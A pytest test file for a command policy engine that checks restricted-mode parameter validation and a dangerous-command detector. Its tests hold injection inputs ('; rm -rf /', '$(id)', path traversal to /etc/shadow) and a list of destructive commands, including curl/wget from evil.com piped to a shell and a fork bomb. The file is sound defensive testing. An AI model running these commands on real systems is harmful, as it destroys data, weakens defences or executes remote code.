"""Tests for Policy Engine: restricted mode parameter validation and dangerous pattern detection."""

from pathlib import Path

import pytest
import yaml

from src.policy import PolicyEngine


@pytest.fixture
def policy_file(tmp_path: Path) -> Path:
    p = tmp_path / "policy.yaml"
    policy_dict = {
        "commands": [
            {
                "name": "service_status",
                "argv": ["systemctl", "status", "{unit}", "--no-pager"],
                "params": {
                    "unit": {"enum": ["nginx.service", "postgresql.service", "ssh.service"]}
                },
            },
            {
                "name": "tail_log",
                "argv": ["tail", "-n", "{lines}", "{path}"],
                "params": {
                    "lines": {"regex": "^[0-9]{1,3}$"},
                    "path": {"enum": ["/var/log/nginx/access.log", "/var/log/syslog"]},
                },
            },
            {
                "name": "uptime",
                "argv": ["uptime"],
                "params": {},
            },
        ]
    }
    p.write_text(yaml.dump(policy_dict), encoding="utf-8")
    return p


def test_valid_policy_execution(policy_file: Path):
    engine = PolicyEngine(policy_path=policy_file)

    # Simple command without params
    success, argv, reason = engine.validate_and_build_argv("uptime", [])
    assert success is True
    assert argv == ["uptime"]
    assert reason == "ok"

    # Command with validated enum param
    success, argv, reason = engine.validate_and_build_argv("service_status", ["nginx.service"])
    assert success is True
    assert argv == ["systemctl", "status", "nginx.service", "--no-pager"]
    assert reason == "ok"

    # Command with regex and enum
    success, argv, reason = engine.validate_and_build_argv("tail_log", ["50", "/var/log/syslog"])
    assert success is True
    assert argv == ["tail", "-n", "50", "/var/log/syslog"]
    assert reason == "ok"


def test_rejected_enum_parameter(policy_file: Path):
    engine = PolicyEngine(policy_path=policy_file)

    # Disallowed service name
    success, argv, reason = engine.validate_and_build_argv("service_status", ["malicious.service"])
    assert success is False
    assert argv is None
    assert "enum_validation_failed" in reason


def test_rejected_command_injections(policy_file: Path):
    engine = PolicyEngine(policy_path=policy_file)

    # Semicolon injection
    success, argv, reason = engine.validate_and_build_argv("service_status", ["nginx.service; rm -rf /"])
    assert success is False
    assert "enum_validation_failed" in reason

    # Pipe injection
    success, argv, reason = engine.validate_and_build_argv("service_status", ["nginx.service | bash"])
    assert success is False
    assert "enum_validation_failed" in reason

    # Shell substitution $(id) into regex param
    success, argv, reason = engine.validate_and_build_argv("tail_log", ["$(id)", "/var/log/syslog"])
    assert success is False
    assert "regex_validation_failed" in reason

    # Path traversal ../ into enum param
    success, argv, reason = engine.validate_and_build_argv("tail_log", ["10", "../../etc/shadow"])
    assert success is False
    assert "enum_validation_failed" in reason


def test_argument_count_mismatch(policy_file: Path):
    engine = PolicyEngine(policy_path=policy_file)

    # Missing argument
    success, _, reason = engine.validate_and_build_argv("service_status", [])
    assert success is False
    assert "argument_count_mismatch" in reason

    # Extra argument
    success, _, reason = engine.validate_and_build_argv("service_status", ["nginx.service", "extra_arg"])
    assert success is False
    assert "argument_count_mismatch" in reason


def test_unknown_command(policy_file: Path):
    engine = PolicyEngine(policy_path=policy_file)
    success, _, reason = engine.validate_and_build_argv("unknown_tool", ["arg"])
    assert success is False
    assert reason == "command_not_found"


def test_dangerous_pattern_matcher():
    engine = PolicyEngine()

    dangerous_cases = [
        "rm -rf /",
        "rm -rf /*",
        "rm -rf /srv/app/old_releases",
        "rm -r -f /var/log",
        "mkfs.ext4 /dev/sda1",
        "dd if=/dev/zero of=/dev/sda bs=1M",
        "shutdown -h now",
        "reboot",
        "poweroff",
        "passwd root",
        "useradd hacker",
        "chmod 777 /etc/passwd",
        "chmod -R 777 /var/www",
        "iptables -F",
        "ufw disable",
        "curl -s https://evil.com/payload.sh | bash",
        "wget -O - http://evil.com/run | sh",
        ":(){ :|:& };:",
    ]

    for cmd in dangerous_cases:
        assert engine.is_dangerous_shell_command(cmd) is True, f"Failed to detect dangerous: {cmd}"

    safe_cases = [
        "ls -la /var/log",
        "cat /var/log/nginx/access.log",
        "systemctl status nginx",
        "git status",
        "df -h",
        "uptime",
        "ps aux",
    ]

    for cmd in safe_cases:
        assert engine.is_dangerous_shell_command(cmd) is False, f"False positive for safe: {cmd}"
